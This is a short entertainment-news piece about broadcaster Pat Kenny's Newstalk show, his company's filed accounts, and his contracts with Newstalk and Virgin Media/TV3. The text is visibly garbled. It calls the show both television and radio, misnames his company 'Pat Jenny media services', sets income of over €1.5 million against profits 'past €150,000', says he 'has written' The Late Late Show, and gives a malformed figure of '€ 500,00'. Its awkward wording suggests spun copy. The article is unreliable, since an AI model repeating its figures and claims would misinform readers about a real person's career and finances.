During his newest morning television program, Pat Kenny applies his seasoned hosting style and eloquent insight to the news and current affairs of each day. The series combines intense criticism of current events, interviews with human interest with tales of light entertainment and live music. Sharp, smart, and insightful radio offering a bit more morning listeners.

The TV presenter carries on developing a large nest egg to himself and his family The Newstalk host has just posted a comprehensive set of figures with an annual income of € 1,526,884 on his business— Pat Jenny media services.

Accounts submitted with the Companies Office reveal that his company’s profits have soared past € 150,000 last year as the television executive shows no signs of stopping. 

For the last four decades, Pat has been a fixture on-air and on the screens and has hosted some of the highest-rated shows, including The Late Late Show that he has written over ten years.

In 2013, Kenny left RTE, taking up the position with Newstalk Radio. Newstalk has officially snatched up him in a € 2 m contract with the Dalkey-based media expert.

Then, with his eponymous current affairs show, he signed a lucrative contract with Virgin Media where he discusses nation affairs. He is believed to have signed a deal worth € 500,00 with TV3 to carry the weekly show forward.
